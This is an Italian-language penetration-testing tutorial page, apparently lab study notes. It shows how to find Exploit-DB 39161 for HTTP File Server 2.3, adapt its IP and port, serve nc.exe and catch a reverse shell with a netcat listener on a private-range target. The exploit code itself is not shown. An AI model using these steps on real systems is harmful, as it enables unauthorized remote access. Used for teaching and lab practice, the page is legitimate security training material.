# Fixing Exploits

## Identificare un servizio running sul target

```
nmap -sV 10.4.23.75
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

## Trovare un exploit per il servizio

```
searchsploit HTTP File Server 2.3
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

## Modificare l'exploit per eseguirlo

```
cd Desktop/
searchsploit -m 39161  #-m per copiare l'exploit nella cartella attuale
vim 39161.py
python 39161.py 10.4.23.75 80 ##e non succede niente, perché non abbiamo letto e compreso come funziona l'exploit
vim 39161.py ##dobbiamo modificare IP e porta locali con quelli corretti
##seguiamo le istruzioni avviando il netcat executable come richiesto dallo script
cp /usr/share/windows-resources/binaries/nc.exe .
ls -al
##in terminale 1 eseguiamo l'exploit, in terminale 2 hostiamo un file server, in terminale 3 il netcat listener
    ##terminale 2:
    python -m SimpleHTTPServer 80
    ##terminale 3:
    nc -nvlp 1234
##terminale 1
python 39161.py 10.4.23.75 80
python 39161.py 10.4.23.75 80 ##lo avvimao due volte perché nei commenti dell'exploit c'era scritto che poteva capitare che non funzionasse al primo lancio, e ci è accaduto
##otteniamo che sul terminale 2 vediamo che vengono fatte le richieste di get di /nc.exe, e poi sul terminale 3 viene aperta una reverse shell ed è possibile eseguire comandi-
    ##terminale 3
    whoami
    systeminfo
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

***

Siamo riusciti ad eseguire un exploit da soli manualmente senza affidarci completamente a Metasploit
